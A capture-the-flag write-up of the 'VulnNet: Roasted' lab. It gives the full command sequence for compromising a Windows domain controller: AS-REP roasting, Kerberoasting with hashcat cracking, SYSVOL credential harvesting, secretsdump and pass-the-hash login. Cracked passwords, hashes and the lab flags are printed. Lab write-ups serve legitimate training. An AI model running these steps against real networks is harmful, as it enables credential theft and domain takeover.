# VulnNet:Roasted

IP: 10.10.117.161

## Nmap
```bash
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-11-01 16:13:26Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack Microsoft Windows RPC
49726/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 52448/tcp): CLEAN (Timeout)
|   Check 2 (port 20341/tcp): CLEAN (Timeout)
|   Check 3 (port 19742/udp): CLEAN (Timeout)
|   Check 4 (port 22129/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-11-01T16:14:20
|_  start_date: N/A

```

## Enum SMB 

- `smbmap -H 10.10.117.161 -u anonymous`
![](https://i.imgur.com/p9lVqUH.png)

- `smbclient -U anonymous -N \\\\10.10.117.161\\VulnNet-Business-Anonymous`

Users found:

Alexa Whitehat - Business Manager
Jack Goldenhand - Business unrelated proposals
Tony Skid - Core security manager
Johnny Leet  - Sync manager

## Enum Usernames

- Anonymous read access to $IPC means we can enumerate usernames: 
- `python3 lookupsid.py anonymous@10.10.117.161`

![](https://i.imgur.com/1TwQt05.png)

### Clean up Usernames in vim

- `:v/User/d` Deleted all occurences that do not have User 
- `:%s/.*\\/\\/` Deleted everything until \
- `Shift + V, Press 16j, type :norm ^x` Deleted all first characters
- `:%normal! WD` Deletes everything after the first occurence of whitespace

```
Guest 
krbtgt 
WIN-2BO8M1OE1M1$ 
enterprise-core-vn 
a-whitehat 
t-skid 
j-goldenhand 
j-leet
```
### Request AS_REP message

- The AS_REP roast attack looks for users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH)
- Anyone can send an AS_REQ request to the DC on behalf of any of those users, and receive an AS_REP message which contains a chunk of data encrypted with the original user key, derived from the users password
- Read more: https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast

- Run to get NETPAGE Unlimited Users: 
`sudo python3 /opt/impacket/examples/GetNPUsers.py vulnnet-rst.local/ -usersfile usernames.txt -no-pass -dc-ip 10.10.117.161`
- This script will attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).

![](https://i.imgur.com/jEus6nL.png)
- Copy hash to hash.txt
- Run `hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`
- Password: tj072889*

> Login details now - `t-skid:tj072889*`

## Post Compromise attack - Kerberoasting

- Run to get SERVICE PRINCIPAL NAME:
`sudo python3 GetUserSPNs.py vulnnet-rst.local/t-skid:tj072889* -outputfile ~/THM/VulnNet_Roasted/kerberoast.hash -dc-ip 10.10.117.161`
- Crack the hash with hashcat:
`hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt`

Retrieved credential: `enterprice-core-vn:ry=ibfkfv,s6h,`

## Getting a shell

- https://github.com/Hackplayers/evil-winrm
- Usually port 5985 open

- Run:
`evil-winrm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,' -i 10.10.117.161`
- Retrieve flag from Desktop/user.txt: `THM{726b7c0baaac1455d05c827b5561f4ed}`

## Priv-esc
### Enumerate SMB with new credentials:
`smbmap -H 10.10.117.161 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'`
- READ access on SYSVOL now:
![](https://i.imgur.com/m89fwEv.png)

- Login to share via smbclient:
`smbclient //10.10.117.161/SYSVOL --user=enterprise-core-vn%ry=ibfkfv,s6h,`

- In the scripts directory, we see a ResetPassword.vbs script with the following credentials for a-whitehat
![](https://i.imgur.com/jDUsC3I.png)

a-whitehat:bNdKVkjv3RR9ht

### Back to Enumerating SMB with new credentials
`smbmap -H 10.10.117.161 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht'`
- Got write access on ADMIN$:
![](https://i.imgur.com/zcx81fB.png)

- Since this user has write access to smb, we can run secretsdump.py to dump hashes of user 
`sudo python3 secretsdump.py vulnnet-rst/a-whitehat:bNdKVkjv3RR9ht@10.10.117.161`


![](https://i.imgur.com/2WUtWmA.png)
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- Attempt to login with evil-winrm with the hash:
`evil-winrm -u 'administrator' -H 'c2597747aa5e43022a3a3049a3c3b09d' -i 10.10.117.161`

- cd into Desktop and run:
`type system.txt`
`THM{16f45e3934293a57645f8d7bf71d8d4c}`
